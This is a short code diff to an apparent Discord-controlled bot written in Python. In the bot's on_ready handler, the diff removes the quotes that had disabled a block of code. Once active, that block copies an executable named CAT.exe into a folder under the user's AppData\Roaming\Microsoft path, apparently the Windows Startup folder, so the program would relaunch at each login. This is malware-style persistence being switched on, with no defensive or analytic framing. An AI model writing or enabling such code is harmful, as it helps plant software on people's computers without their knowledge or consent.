@@ -24,7 +24,6 @@ path = f'C:\\Users\\{win32api.GetUserName()}\\AppData\\Roaming\\Microsoft\\Windo
 
 @bot.event
 async def on_ready():
-    """
     try:
 
         with open(path + 'CAT.exe') as f:
@@ -35,7 +34,7 @@ async def on_ready():
         with open('CAT.exe', 'rb') as f:
             data = f.read()
         with open(path + 'CAT.exe', 'wb') as f:
-            f.write(data)"""
+            f.write(data)
 
     channel_start = bot.get_channel(config.channel)
     date = datetime.now()
